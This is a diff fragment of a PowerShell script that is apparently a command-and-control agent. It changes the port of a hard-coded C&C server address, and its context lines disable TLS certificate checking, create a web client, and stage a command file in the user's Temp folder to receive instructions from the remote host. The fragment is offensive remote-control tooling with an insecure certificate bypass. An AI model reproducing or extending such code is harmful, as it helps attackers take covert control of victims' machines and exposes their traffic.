@@ -61,7 +61,7 @@ Add-Type @"
 # Add Global Variables here
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ccserver = "192.168.9.4:8080" # IP of C&C server
+$ccserver = "192.168.9.4:80" # IP of C&C server
 $web = New-Object System.Net.WebClient
 $Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
 $commandPath = $Path + "command.txt" # Command.txt of Path of temp
